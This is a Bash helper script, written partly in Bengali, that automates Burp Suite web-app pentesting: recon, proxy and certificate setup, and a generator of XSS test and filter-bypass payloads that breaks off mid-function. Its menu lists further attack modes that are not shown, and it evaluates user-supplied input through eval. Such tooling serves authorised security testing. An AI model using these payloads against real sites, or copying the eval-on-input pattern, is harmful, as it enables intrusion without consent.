#!/bin/bash

# ================================================================
#   BURP SUITE - Full Automation & Helper Tool
#   Author: SAIMUM
# ================================================================

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

RESULTS_DIR="$HOME/burpsuite_results"
HISTORY_FILE="$HOME/.burpsuite_saimum_history.log"
mkdir -p "$RESULTS_DIR"

# ================================================================
# BANNER
# ================================================================
show_banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo ' ██████╗ ██╗   ██╗██████╗ ██████╗     ███████╗██╗   ██╗██╗████████╗███████╗'
    echo ' ██╔══██╗██║   ██║██╔══██╗██╔══██╗    ██╔════╝██║   ██║██║╚══██╔══╝██╔════╝'
    echo ' ██████╔╝██║   ██║██████╔╝██████╔╝    ███████╗██║   ██║██║   ██║   █████╗  '
    echo ' ██╔══██╗██║   ██║██╔══██╗██╔═══╝     ╚════██║██║   ██║██║   ██║   ██╔══╝  '
    echo ' ██████╔╝╚██████╔╝██║  ██║██║         ███████║╚██████╔╝██║   ██║   ███████╗'
    echo ' ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝'
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}    ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}    ║                    S A I M U M                        ║${NC}"
    echo -e "${YELLOW}${BOLD}    ╚═══════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}${WHITE}      Burp Suite Full Helper & Automation | Web App Pentesting${NC}"
    echo ""
    echo -e "  ${RED}${BOLD}⚠  Ethics Warning:${NC} ${WHITE}শুধুমাত্র নিজের বা অনুমতি আছে এমন target এ ব্যবহার করুন।${NC}"
    echo ""
}

# ================================================================
# CHECK DEPENDENCIES
# ================================================================
check_deps() {
    echo -e "${CYAN}[*] Dependencies চেক করা হচ্ছে...${NC}"
    local missing=()

    # Burp Suite check
    BURP_CMD=""
    BURP_JAR=""
    for b in burpsuite burp-suite burp; do
        if command -v "$b" &>/dev/null; then
            BURP_CMD="$b"
            echo -e "  ${GREEN}[✓] $b — found${NC}"
            break
        fi
    done

    # Check for JAR
    local jar_paths=(
        "$HOME/BurpSuitePro.jar"
        "$HOME/BurpSuiteCommunity.jar"
        "$HOME/burpsuite.jar"
        "/opt/burpsuite/burpsuite.jar"
        "/usr/share/burpsuite/burpsuite.jar"
    )
    for jp in "${jar_paths[@]}"; do
        if [ -f "$jp" ]; then
            BURP_JAR="$jp"
            echo -e "  ${GREEN}[✓] Burp JAR: $jp${NC}"
            break
        fi
    done

    if [ -z "$BURP_CMD" ] && [ -z "$BURP_JAR" ]; then
        echo -e "  ${YELLOW}[!] Burp Suite binary পাওয়া যায়নি।${NC}"
        echo -e "  ${DIM}    Download: https://portswigger.net/burp/communitydownload${NC}"
    fi

    # Helper tools
    for tool in curl wget python3 java nc openssl; do
        if command -v "$tool" &>/dev/null; then
            echo -e "  ${GREEN}[✓] $tool${NC}"
        else
            echo -e "  ${YELLOW}[!] $tool — নেই (কিছু feature কাজ নাও করতে পারে)${NC}"
        fi
    done

    # Optional tools
    echo ""
    echo -e "${CYAN}[*] Optional tools:${NC}"
    for opt in sqlmap nikto ffuf gobuster nuclei; do
        if command -v "$opt" &>/dev/null; then
            echo -e "  ${GREEN}[✓] $opt — available${NC}"
        else
            echo -e "  ${YELLOW}[!] $opt — নেই${NC}"
        fi
    done

    # Java check for JAR
    if command -v java &>/dev/null; then
        local jver; jver=$(java -version 2>&1 | head -1)
        echo ""
        echo -e "${CYAN}[*] Java: ${GREEN}$jver${NC}"
    fi

    echo ""
}

# ================================================================
# GET TARGET
# ================================================================
get_target() {
    TARGET=""
    TARGET_PORT=""
    TARGET_PROTO=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║         TARGET SELECT                ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""
    read -p "$(echo -e ${WHITE}"Target URL দিন (e.g. http://target.com): "${NC})" t

    # Parse URL
    if [[ "$t" == https://* ]]; then
        TARGET_PROTO="https"
        TARGET=$(echo "$t" | sed 's|https://||' | cut -d'/' -f1)
        TARGET_PORT="${TARGET_PORT:-443}"
    elif [[ "$t" == http://* ]]; then
        TARGET_PROTO="http"
        TARGET=$(echo "$t" | sed 's|http://||' | cut -d'/' -f1)
        TARGET_PORT="${TARGET_PORT:-80}"
    else
        TARGET_PROTO="http"
        TARGET="$t"
        TARGET_PORT="80"
    fi

    # Extract port if given
    if echo "$TARGET" | grep -q ":"; then
        TARGET_PORT=$(echo "$TARGET" | cut -d':' -f2)
        TARGET=$(echo "$TARGET" | cut -d':' -f1)
    fi

    TARGET_URL="${TARGET_PROTO}://${TARGET}:${TARGET_PORT}"
    echo -e "  ${GREEN}[✓] Target: $TARGET_URL${NC}"
    echo ""
}

# ================================================================
# WHOIS + RECON
# ================================================================
pre_scan_recon() {
    local target=$1
    echo ""
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}${BOLD}   PRE-SCAN RECON  ›  $target${NC}"
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    # WHOIS
    echo -e "${MAGENTA}${BOLD}┌─── WHOIS ─────────────────────────────────────────┐${NC}"
    whois "$target" 2>/dev/null | grep -E "Registrar:|Country:|Organization:|Name Server:" | head -8 | \
        while IFS= read -r line; do echo -e "  ${WHITE}$line${NC}"; done
    echo -e "${MAGENTA}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""

    # GeoIP
    echo -e "${BLUE}${BOLD}┌─── GEO IP ─────────────────────────────────────────┐${NC}"
    local geo; geo=$(curl -s --max-time 5 "http://ip-api.com/json/$target" 2>/dev/null)
    if echo "$geo" | grep -q '"status":"success"'; then
        local ip country city isp
        ip=$(echo "$geo" | grep -o '"query":"[^"]*"' | cut -d'"' -f4)
        country=$(echo "$geo" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
        city=$(echo "$geo" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
        isp=$(echo "$geo" | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
        echo -e "  ${WHITE}IP: ${GREEN}$ip${NC}  ${WHITE}Country: ${GREEN}$country${NC}  ${WHITE}City: ${GREEN}$city${NC}"
        echo -e "  ${WHITE}ISP: ${GREEN}$isp${NC}"
    fi
    echo -e "${BLUE}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""

    # HTTP Headers
    echo -e "${CYAN}${BOLD}┌─── HTTP HEADERS ───────────────────────────────────┐${NC}"
    local headers; headers=$(curl -s -I --max-time 8 "${TARGET_PROTO}://${target}:${TARGET_PORT}" 2>/dev/null | head -20)
    if [ -n "$headers" ]; then
        local code server powered xframe csp hsts
        code=$(echo "$headers" | head -1)
        server=$(echo "$headers" | grep -i "^Server:" | head -1)
        powered=$(echo "$headers" | grep -i "^X-Powered-By:" | head -1)
        xframe=$(echo "$headers" | grep -i "^X-Frame-Options:" | head -1)
        csp=$(echo "$headers" | grep -i "^Content-Security-Policy:" | head -1)
        hsts=$(echo "$headers" | grep -i "^Strict-Transport-Security:" | head -1)

        echo -e "  ${WHITE}Status     : ${GREEN}$code${NC}"
        [ -n "$server"  ] && echo -e "  ${WHITE}Server     : ${YELLOW}$server${NC}"
        [ -n "$powered" ] && echo -e "  ${WHITE}Powered-By : ${YELLOW}$powered${NC}"

        echo ""
        echo -e "  ${CYAN}Security Headers:${NC}"
        [ -n "$xframe" ] && echo -e "  ${GREEN}[✓] X-Frame-Options set${NC}" || echo -e "  ${RED}[✗] X-Frame-Options missing — Clickjacking সম্ভব!${NC}"
        [ -n "$csp"    ] && echo -e "  ${GREEN}[✓] Content-Security-Policy set${NC}" || echo -e "  ${YELLOW}[!] CSP missing — XSS risk${NC}"
        [ -n "$hsts"   ] && echo -e "  ${GREEN}[✓] HSTS set${NC}" || echo -e "  ${YELLOW}[!] HSTS missing (HTTPS এ থাকলে দরকার)${NC}"

        echo ""
        echo -e "  ${CYAN}WAF Detection:${NC}"
        local waf=false
        for wh in "X-WAF" "X-Sucuri" "cf-ray" "X-Firewall" "X-CDN" "X-Mod-Security"; do
            echo "$headers" | grep -qi "^$wh:" && echo -e "  ${RED}[!] WAF: $wh detected${NC}" && waf=true
        done
        $waf || echo -e "  ${GREEN}[✓] স্পষ্ট WAF header নেই${NC}"
    fi
    echo -e "${CYAN}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# SCAN MENU
# ================================================================
show_menu() {
    echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}${BOLD}║                  BURP SUITE HELPER OPTIONS                          ║${NC}"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ BURP LAUNCH ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}1${NC}  Burp Suite Launch             — Burp GUI চালু করো"
    echo -e "${YELLOW}║${NC} ${GREEN}2${NC}  Burp Headless (JAR)           — GUI ছাড়া background এ"
    echo -e "${YELLOW}║${NC} ${GREEN}3${NC}  Burp Proxy Setup Guide        — browser proxy config"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ PROXY & INTERCEPT HELPERS ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}4${NC}  Proxy Listener Test           — proxy চালু আছে কিনা দেখো"
    echo -e "${YELLOW}║${NC} ${GREEN}5${NC}  CA Certificate Export Guide   — SSL cert install guide"
    echo -e "${YELLOW}║${NC} ${GREEN}6${NC}  Upstream Proxy Config         — chain proxy setup"
    echo -e "${YELLOW}║${NC} ${GREEN}7${NC}  Intercept Request via curl    — curl দিয়ে Burp এ পাঠাও"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ MANUAL VULNERABILITY TESTING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}8${NC}  XSS Payload Generator         — XSS test payloads"
    echo -e "${YELLOW}║${NC} ${GREEN}9${NC}  SQLi Payload Generator        — SQL injection payloads"
    echo -e "${YELLOW}║${NC} ${GREEN}10${NC} SSRF Payload Generator        — SSRF test payloads"
    echo -e "${YELLOW}║${NC} ${GREEN}11${NC} IDOR Test Helper              — IDOR check guide"
    echo -e "${YELLOW}║${NC} ${GREEN}12${NC} CSRF Token Checker            — CSRF vulnerability check"
    echo -e "${YELLOW}║${NC} ${GREEN}13${NC} File Upload Bypass Payloads   — upload restriction bypass"
    echo -e "${YELLOW}║${NC} ${GREEN}14${NC} JWT Token Analyzer            — JWT decode & test"
    echo -e "${YELLOW}║${NC} ${GREEN}15${NC} Open Redirect Payloads        — redirect vulnerability"
    echo -e "${YELLOW}║${NC} ${GREEN}16${NC} Command Injection Payloads    — OS command injection"
    echo -e "${YELLOW}║${NC} ${GREEN}17${NC} Path Traversal Payloads       — directory traversal"
    echo -e "${YELLOW}║${NC} ${GREEN}18${NC} XXE Payloads                  — XML External Entity"
    echo -e "${YELLOW}║${NC} ${GREEN}19${NC} SSTI Payloads                 — Server-Side Template Injection"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ INTRUDER HELPERS ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}20${NC} Intruder: Sniper Setup Guide  — single parameter fuzzing"
    echo -e "${YELLOW}║${NC} ${GREEN}21${NC} Intruder: Cluster Bomb Guide  — multiple parameter"
    echo -e "${YELLOW}║${NC} ${GREEN}22${NC} Intruder: Payload List Gen    — custom payload list তৈরি"
    echo -e "${YELLOW}║${NC} ${GREEN}23${NC} Brute Force Login Helper      — login form attack guide"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ REPEATER & SCANNER HELPERS ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}24${NC} HTTP Request Builder          — raw HTTP request তৈরি"
    echo -e "${YELLOW}║${NC} ${GREEN}25${NC} Active Scan via curl          — external scan trigger"
    echo -e "${YELLOW}║${NC} ${GREEN}26${NC} Spider / Crawl Helper         — URL discovery guide"
    echo -e "${YELLOW}║${NC} ${GREEN}27${NC} Scope Config Generator        — target scope setup"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ SSL / TLS TESTING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}28${NC} SSL Strip Test                — HTTPS downgrade check"
    echo -e "${YELLOW}║${NC} ${GREEN}29${NC} Certificate Info              — SSL cert details"
    echo -e "${YELLOW}║${NC} ${GREEN}30${NC} HTTPS Security Headers Check  — security header audit"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ REPORTING & UTILITY ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}31${NC} Vulnerability Report Template — findings লেখার template"
    echo -e "${YELLOW}║${NC} ${GREEN}32${NC} Burp Extension Suggestions   — useful extensions list"
    echo -e "${YELLOW}║${NC} ${GREEN}33${NC} WAF Bypass Techniques        — WAF এড়ানোর পদ্ধতি"
    echo -e "${YELLOW}║${NC} ${GREEN}34${NC} Request/Response Decoder      — encode/decode helper"
    echo -e "${YELLOW}║${NC} ${GREEN}35${NC} All-in-One Web Recon          — সব check একসাথে"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC}  ${RED}0)${NC} Exit                                                               ${YELLOW}║${NC}"
    echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ================================================================
# BURP PROXY CONFIG
# ================================================================
BURP_PROXY_HOST="127.0.0.1"
BURP_PROXY_PORT="8080"

get_proxy_config() {
    read -p "$(echo -e ${WHITE}"Burp Proxy Host (Enter=127.0.0.1): "${NC})" ph
    [ -n "$ph" ] && BURP_PROXY_HOST="$ph"
    read -p "$(echo -e ${WHITE}"Burp Proxy Port (Enter=8080): "${NC})" pp
    [ -n "$pp" ] && BURP_PROXY_PORT="$pp"
    echo -e "  ${GREEN}[✓] Proxy: $BURP_PROXY_HOST:$BURP_PROXY_PORT${NC}"
    echo ""
}

# ================================================================
# MODE 1 — LAUNCH BURP
# ================================================================
mode_launch_burp() {
    echo ""
    echo -e "${RED}${BOLD}[*] Burp Suite চালু করা হচ্ছে...${NC}"
    echo ""

    if [ -n "$BURP_CMD" ]; then
        echo -e "${GREEN}কমান্ড: $BURP_CMD${NC}"
        nohup $BURP_CMD &>/dev/null &
        echo -e "${GREEN}[✓] Burp Suite background এ চালু হয়েছে।${NC}"
    elif [ -n "$BURP_JAR" ]; then
        echo -e "${GREEN}কমান্ড: java -jar $BURP_JAR${NC}"
        nohup java -jar "$BURP_JAR" &>/dev/null &
        echo -e "${GREEN}[✓] Burp Suite JAR background এ চালু হয়েছে।${NC}"
    else
        echo -e "${YELLOW}[!] Burp Suite পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Download: https://portswigger.net/burp/communitydownload${NC}"
        echo ""
        echo -e "${WHITE}Install করুন:${NC}"
        echo -e "  ${CYAN}sudo apt install burpsuite${NC}"
        echo -e "  ${CYAN}অথবা snap install burpsuite-community-edition${NC}"
    fi

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Burp Suite Quick Guide ━━━${NC}"
    echo -e "  ${WHITE}1. Proxy → Options → Listeners → 127.0.0.1:8080${NC}"
    echo -e "  ${WHITE}2. Browser এ proxy set করুন: 127.0.0.1:8080${NC}"
    echo -e "  ${WHITE}3. Proxy → Intercept → On করুন${NC}"
    echo -e "  ${WHITE}4. Target এ browse করুন — request দেখাবে${NC}"
    echo ""
}

# ================================================================
# MODE 2 — HEADLESS
# ================================================================
mode_headless() {
    echo ""
    if [ -n "$BURP_JAR" ]; then
        read -p "$(echo -e ${WHITE}"Config file path (Enter=skip): "${NC})" cfg
        local cfg_opt=""
        [ -n "$cfg" ] && [ -f "$cfg" ] && cfg_opt="--config-file=$cfg"
        echo -e "${GREEN}[*] Burp headless mode চালু হচ্ছে...${NC}"
        java -jar "$BURP_JAR" --headless.mode=true $cfg_opt &
        echo -e "${GREEN}[✓] PID: $!${NC}"
    else
        echo -e "${YELLOW}[!] Burp JAR পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Pro version এ headless mode available।${NC}"
        echo -e "${DIM}java -jar burpsuite_pro.jar --headless.mode=true --config-file=config.json${NC}"
    fi
}

# ================================================================
# MODE 3 — PROXY SETUP GUIDE
# ================================================================
mode_proxy_guide() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          BURP PROXY SETUP GUIDE                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 1: Burp Listener Config ━━━${NC}"
    echo -e "  ${WHITE}Burp → Proxy → Options → Proxy Listeners${NC}"
    echo -e "  ${GREEN}▸ Add: 127.0.0.1:8080${NC}"
    echo -e "  ${GREEN}▸ Running: ✓ চেক করুন${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 2: Firefox Browser Setup ━━━${NC}"
    echo -e "  ${WHITE}Settings → Network → Manual Proxy:${NC}"
    echo -e "  ${GREEN}▸ HTTP Proxy: 127.0.0.1  Port: 8080${NC}"
    echo -e "  ${GREEN}▸ HTTPS Proxy: 127.0.0.1  Port: 8080${NC}"
    echo -e "  ${GREEN}▸ 'Also use for HTTPS' চেক করুন${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 3: FoxyProxy Extension (Recommended) ━━━${NC}"
    echo -e "  ${WHITE}Firefox Add-ons → FoxyProxy Standard install করুন${NC}"
    echo -e "  ${GREEN}▸ New Proxy: Title=Burp, Host=127.0.0.1, Port=8080${NC}"
    echo -e "  ${GREEN}▸ একটি click এ proxy on/off করা যায়${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 4: curl দিয়ে Proxy Test ━━━${NC}"
    echo -e "  ${CYAN}curl -x http://127.0.0.1:8080 http://target.com -v${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 5: Python Requests দিয়ে ━━━${NC}"
    echo -e "  ${CYAN}proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}${NC}"
    echo -e "  ${CYAN}requests.get('http://target.com', proxies=proxies, verify=False)${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Android Device Proxy ━━━${NC}"
    echo -e "  ${WHITE}WiFi Settings → Modify Network → Manual Proxy${NC}"
    echo -e "  ${GREEN}▸ Host: <আপনার PC এর IP>  Port: 8080${NC}"
    echo ""
}

# ================================================================
# MODE 4 — PROXY LISTENER TEST
# ================================================================
mode_proxy_test() {
    get_proxy_config

    echo ""
    echo -e "${CYAN}[*] Burp Proxy $BURP_PROXY_HOST:$BURP_PROXY_PORT চেক করা হচ্ছে...${NC}"
    echo ""

    # Check if port is listening
    if command -v nc &>/dev/null; then
        nc -z -w 3 "$BURP_PROXY_HOST" "$BURP_PROXY_PORT" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "  ${GREEN}${BOLD}[✓] Burp Proxy চালু আছে — $BURP_PROXY_HOST:$BURP_PROXY_PORT${NC}"
        else
            echo -e "  ${RED}[✗] Burp Proxy চালু নেই!${NC}"
            echo -e "  ${YELLOW}→ Burp Suite চালু করুন এবং Proxy Listener enable করুন।${NC}"
            return
        fi
    fi

    # Test request through proxy
    echo ""
    echo -e "${CYAN}[*] Test request পাঠানো হচ্ছে proxy দিয়ে...${NC}"
    local resp
    resp=$(curl -s -o /dev/null -w "%{http_code}" \
        --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
        --max-time 8 \
        "$TARGET_URL" 2>/dev/null)

    echo -e "  ${WHITE}Response Code: ${GREEN}$resp${NC}"
    [ -n "$resp" ] && echo -e "  ${GREEN}[✓] Proxy দিয়ে request সফল!${NC}" || \
        echo -e "  ${YELLOW}[!] Response পাওয়া যায়নি।${NC}"

    echo ""
    echo "$(date) | Proxy Test | $BURP_PROXY_HOST:$BURP_PROXY_PORT" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 5 — CA CERT GUIDE
# ================================================================
mode_ca_cert_guide() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          BURP CA CERTIFICATE INSTALL GUIDE              ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 1: CA Cert Download ━━━${NC}"
    echo -e "  ${WHITE}Browser এ যান: ${CYAN}http://burp${NC} (Proxy চালু থাকলে)"
    echo -e "  ${WHITE}অথবা: ${CYAN}http://127.0.0.1:8080${NC}"
    echo -e "  ${GREEN}▸ 'CA Certificate' বাটনে click করুন${NC}"
    echo -e "  ${GREEN}▸ cacert.der ডাউনলোড হবে${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 2: Firefox এ Install ━━━${NC}"
    echo -e "  ${WHITE}Settings → Privacy & Security → Certificates${NC}"
    echo -e "  ${GREEN}▸ 'View Certificates' → Authorities → Import${NC}"
    echo -e "  ${GREEN}▸ cacert.der select করুন${NC}"
    echo -e "  ${GREEN}▸ 'Trust this CA to identify websites' চেক করুন${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 3: Chrome/Chromium এ Install ━━━${NC}"
    echo -e "  ${WHITE}Settings → Privacy → Security → Manage Certificates${NC}"
    echo -e "  ${GREEN}▸ Authorities → Import → cacert.der${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 4: Linux System Wide ━━━${NC}"
    echo -e "  ${CYAN}wget http://127.0.0.1:8080/cert -O burp_ca.der${NC}"
    echo -e "  ${CYAN}openssl x509 -inform DER -in burp_ca.der -out burp_ca.crt${NC}"
    echo -e "  ${CYAN}sudo cp burp_ca.crt /usr/local/share/ca-certificates/${NC}"
    echo -e "  ${CYAN}sudo update-ca-certificates${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step 5: Android এ Install ━━━${NC}"
    echo -e "  ${WHITE}cacert.der ফোনে পাঠান → Settings → Security → Install Certificate${NC}"
    echo ""

    # Try to download cert automatically
    read -p "$(echo -e ${YELLOW}"এখনই CA Cert download করবেন? (y/n): "${NC})" dl_ch
    if [[ "$dl_ch" =~ ^[Yy]$ ]]; then
        local cert_file="$RESULTS_DIR/burp_cacert_$(date +%Y%m%d_%H%M%S).der"
        echo ""
        echo -e "${CYAN}[*] Downloading CA cert...${NC}"
        if curl -s --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
            "http://burp/cert" -o "$cert_file" 2>/dev/null && [ -s "$cert_file" ]; then
            echo -e "${GREEN}[✓] Downloaded: $cert_file${NC}"
        else
            echo -e "${YELLOW}[!] Download হয়নি — Burp Proxy চালু থাকলে আবার try করুন।${NC}"
        fi
    fi
}

# ================================================================
# MODE 6 — UPSTREAM PROXY
# ================================================================
mode_upstream_proxy() {
    echo ""
    echo -e "${CYAN}${BOLD}Upstream Proxy Chain Setup:${NC}"
    echo -e "${DIM}Burp → Upstream Proxy → Target${NC}"
    echo ""
    echo -e "${WHITE}Burp Suite → User Options → Connections → Upstream Proxy Servers${NC}"
    echo ""
    read -p "$(echo -e ${WHITE}"Upstream proxy host দিন: "${NC})" up_host
    read -p "$(echo -e ${WHITE}"Upstream proxy port দিন: "${NC})" up_port
    read -p "$(echo -e ${WHITE}"Auth লাগবে? (y/n): "${NC})" auth_ch

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Config Summary ━━━${NC}"
    echo -e "  ${WHITE}Destination Host : * (সব)${NC}"
    echo -e "  ${WHITE}Proxy Host       : $up_host${NC}"
    echo -e "  ${WHITE}Proxy Port       : $up_port${NC}"

    if [[ "$auth_ch" =~ ^[Yy]$ ]]; then
        read -p "$(echo -e ${WHITE}"Username: "${NC})" up_user
        read -p "$(echo -e ${WHITE}"Password: "${NC})" up_pass
        echo -e "  ${WHITE}Auth             : $up_user:****${NC}"
    fi

    echo ""
    echo -e "${YELLOW}[!] এই settings Burp এর UI তে manually enter করতে হবে।${NC}"
    echo ""

    # Test via curl
    read -p "$(echo -e ${YELLOW}"Upstream proxy test করবেন curl দিয়ে? (y/n): "${NC})" test_ch
    if [[ "$test_ch" =~ ^[Yy]$ ]]; then
        local proxy_url="http://$up_host:$up_port"
        [[ "$auth_ch" =~ ^[Yy]$ ]] && proxy_url="http://${up_user}:${up_pass}@${up_host}:${up_port}"
        echo ""
        curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
            --proxy "$proxy_url" --max-time 10 "$TARGET_URL" 2>/dev/null
    fi
}

# ================================================================
# MODE 7 — INTERCEPT VIA CURL
# ================================================================
mode_intercept_curl() {
    get_proxy_config

    echo ""
    echo -e "${CYAN}${BOLD}curl দিয়ে Burp Proxy এ request পাঠানো:${NC}"
    echo ""

    read -p "$(echo -e ${WHITE}"URL দিন: "${NC})" req_url
    [ -z "$req_url" ] && req_url="$TARGET_URL"

    echo -e "${CYAN}Method:${NC}"
    echo -e "  ${GREEN}1)${NC} GET  ${GREEN}2)${NC} POST  ${GREEN}3)${NC} PUT  ${GREEN}4)${NC} DELETE  ${GREEN}5)${NC} Custom"
    read -p "$(echo -e ${YELLOW}"[1-5]: "${NC})" mch
    local method="GET"
    case $mch in
        2) method="POST" ;; 3) method="PUT" ;; 4) method="DELETE" ;;
        5) read -p "$(echo -e ${WHITE}"Method: "${NC})" method ;;
    esac

    local data_opt=""
    if [[ "$method" == "POST" ]] || [[ "$method" == "PUT" ]]; then
        read -p "$(echo -e ${WHITE}"POST data দিন: "${NC})" post_data
        data_opt="-d '$post_data'"
    fi

    local headers_opt=""
    read -p "$(echo -e ${WHITE}"Custom header দিন (Enter=skip, e.g. Authorization: Bearer xxx): "${NC})" custom_hdr
    [ -n "$custom_hdr" ] && headers_opt="-H '$custom_hdr'"

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out_file="$RESULTS_DIR/curl_intercept_${ts}.txt"

    echo ""
    local full_cmd="curl -x http://$BURP_PROXY_HOST:$BURP_PROXY_PORT -X $method $headers_opt $data_opt -k -v '$req_url'"
    echo -e "${CYAN}কমান্ড: $full_cmd${NC}"
    echo ""

    read -p "$(echo -e ${YELLOW}"[?] Request পাঠাবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    echo ""
    eval "curl -x http://$BURP_PROXY_HOST:$BURP_PROXY_PORT -X $method $headers_opt $data_opt -k -v '$req_url'" 2>&1 | tee "$out_file"

    echo ""
    echo -e "${GREEN}[✓] Output saved: $out_file${NC}"
    bangla_analysis_web "$out_file"
    suggest_next_tool_web "$out_file"
    echo "$(date) | curl Intercept | $req_url | $out_file" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 8 — XSS PAYLOADS
# ================================================================
mode_xss_payloads() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/xss_payloads_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          XSS PAYLOAD GENERATOR                          ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Basic XSS ━━━${NC}"
    local basic_payloads=(
        '<script>alert(1)</script>'
        '<script>alert("XSS")</script>'
        '<img src=x onerror=alert(1)>'
        '<svg onload=alert(1)>'
        '"><script>alert(1)</script>'
        "'><script>alert(1)</script>"
        '<body onload=alert(1)>'
        '<iframe src="javascript:alert(1)">'
        '<input onfocus=alert(1) autofocus>'
        '<select onchange=alert(1)><option>test'
    )
    for p in "${basic_payloads[@]}"; do
        echo -e "  ${GREEN}▸ $p${NC}"
        echo "$p" >> "$out"
    done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Filter Bypass XSS ━━━${NC}"
    local bypass_payloads=(
        '<ScRiPt>alert(1)</ScRiPt>'
        '<script>alert`1`</script>'
        '<img/src=x onerror=alert(1)>'
        '<svg/onload=alert(1)>'
        'javascript:alert(1)'
        '&#60;script&#62;alert(1)&#60;/script&#62;'
        '\x3cscript\x3ealert(1)\x3c/script\x3e'
        '<script>eval(atob("YWxlcnQoMSk="))</script>'
        '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">'
        '<details open ontoggle=alert(1)>'
    )
    for p in "${bypass_payloads[@]}"; do
        echo -e "  ${YELLOW}▸ $p${NC}"
